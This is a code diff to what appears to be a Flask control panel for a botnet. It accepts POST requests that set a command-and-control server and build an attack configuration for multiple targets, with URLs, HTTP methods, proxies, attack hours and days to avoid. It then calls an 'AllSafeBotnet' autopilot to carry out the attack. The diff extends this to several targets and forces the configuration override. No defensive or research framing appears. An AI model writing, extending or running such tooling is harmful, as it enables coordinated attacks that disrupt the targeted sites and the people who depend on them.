@@ -51,21 +51,21 @@ set to False.
 """
 @app.route("/submit", methods=['POST'])
 def performAttack():
+    print(request.json)
     if 'attack' in request.json:
         if request.json['attack'] == 'begin':
-            print(request.json)
+            print("inizio")
             # retrieving and polishing C&C server and prepare config file
             cc_server = prepareConfigFile(request.json)
             if '://' not in cc_server:
                 cc_server = 'http://' + cc_server
             allsafe = Botnet.AllSafeBotnet()
-            allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
+            allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=True)
+            print("done")
             return "OK", 200
         else:
-            print(request.json['attack'])
             return "Invalid request", 402
     else:
-        print(request.json)
         return "Forbidden!", 403
 
 def prepareConfigFile(params, where='./data/current_attack.json'):
@@ -74,56 +74,65 @@ def prepareConfigFile(params, where='./data/current_attack.json'):
 
     # Only the useful key values will be changed accordingly
     localRootSchema['last_modified'] = round(time())
-    localRootSchema['cc_server'] = params['cc_server']
+    localRootSchema['cc_server'] = params['cc_server'] if 'cc_server' in params else ""
 
-    # Creation of the locaTargetSchema based upon the TargetSchema
-    localTargetSchema = targetSchema
-    localTargetSchema['period'] = params['period']
-    localTargetSchema['max_count'] = params['max_count']
 
-    # Creation of the actionCondition dictionary
-    actionConditions = OrderedDict()
-
-    # If AMPM has been choosen both AM and PM will be set on 1
-    ampm = params['AMPM'];
-    if ampm == "AM":
-        actionConditions['AM'] = 1
-    if ampm == "PM":
-        actionConditions['PM'] = 1
-    if ampm == "AMPM":
-        actionConditions['AM'] = 1
-        actionConditions['PM'] = 1
-
-    actionConditions['attack_time'] = params['hour_start'] + "-" + params['hour_end']
-    actionConditions['avoid_week'] = params['avoid_week']
-    actionConditions['avoid_month'] = params['avoid_month']
-
-    # ActionConditions is now poart of the localTargetSchema
-    localTargetSchema['action_conditions'] = actionConditions
 
     # Creation of the requestSchema
-    localRequestSchema = requestSchema
-    localRequestSchema['method'] = params['method']
-    localRequestSchema['url'] = params['url']
-    localRequestSchema['resources'] = params['resources']
-    localRequestSchema['encoding'] = params['encoding']
+    for elem in params['target']:
+        # Creation of the locaTargetSchema based upon the TargetSchema
+        localTargetSchema = targetSchema
+        localTargetSchema['period'] = elem['period'] if 'period' in params else 0
+        localTargetSchema['max_count'] = elem['max_count'] if 'max_count' in params else 0
 
-    # Creation of the proxy dictionary
-    proxy = OrderedDict()
+        # Creation of the actionCondition dictionary
+        actionConditions = OrderedDict()
 
-    # If an element has been specified as https, it will be handeld properly
-    for proxy_elem in params['proxy']:
-        if "https://" in proxy_elem:
-            proxy['https'] = proxy_elem
+        # If AMPM has been choosen both AM and PM will be set on 1
+        ampm = elem['AMPM'] if 'AMPM' in elem else ""
+        if ampm == "AM":
+            actionConditions['AM'] = 1
+            actionConditions['PM'] = 0
+        if ampm == "PM":
+            actionConditions['AM'] = 0
+            actionConditions['PM'] = 1
+        if ampm == "AMPM":
+            actionConditions['AM'] = 1
+            actionConditions['PM'] = 1
+        if elem['hour_start'] == "" or elem['hour_end'] == "":
+            actionConditions['attack_time'] = ""
         else:
-            proxy['http'] = proxy_elem
+            actionConditions['attack_time'] = elem['hour_start'] + "-" + elem['hour_end']
+        actionConditions['avoid_week'] = elem['avoid_week'] if 'avoid_week' in params else ""
+        actionConditions['avoid_month'] = elem['avoid_month'] if 'avoid_month' in params else ""
 
-    # Proxy is now part of localRequestSchema
-    localRequestSchema['proxy_server'] = proxy
+        # ActionConditions is now poart of the localTargetSchema
+        localTargetSchema['action_conditions'] = actionConditions
 
-    # Final combination of the three schemas
-    localTargetSchema['request_params'] = localRequestSchema
-    localRootSchema['targets'].append(localTargetSchema)
+
+
+        localRequestSchema = requestSchema
+        localRequestSchema['method'] = elem['method'] if 'method' in elem else ""
+        localRequestSchema['url'] = elem['url'] if 'url' in elem else ""
+        localRequestSchema['resources'] = elem['resources'] if 'resources' in elem else ""
+        localRequestSchema['encoding'] = elem['encoding'] if 'encoding' in elem else ""
+
+        # Creation of the proxy dictionary
+        proxy = OrderedDict()
+
+        # If an element has been specified as https, it will be handeld properly
+        for proxy_elem in elem['proxy']:
+            if "https://" in proxy_elem:
+                proxy['https'] = proxy_elem
+            else:
+                proxy['http'] = proxy_elem
+
+        # Proxy is now part of localRequestSchema
+        localRequestSchema['proxy_server'] = proxy
+
+        # Final combination of the three schemas
+        localTargetSchema['request_params'] = localRequestSchema
+        localRootSchema['targets'].append(localTargetSchema)
 
     #The json configuration will be written
     file = open(where, "w")
@@ -131,6 +140,9 @@ def prepareConfigFile(params, where='./data/current_attack.json'):
     file.close()
     return params['cc_server']
 
+@app.route("/p")
+def ret():
+    return render_template("targetpreferences.html")
 
 
 if __name__ == "__main__":
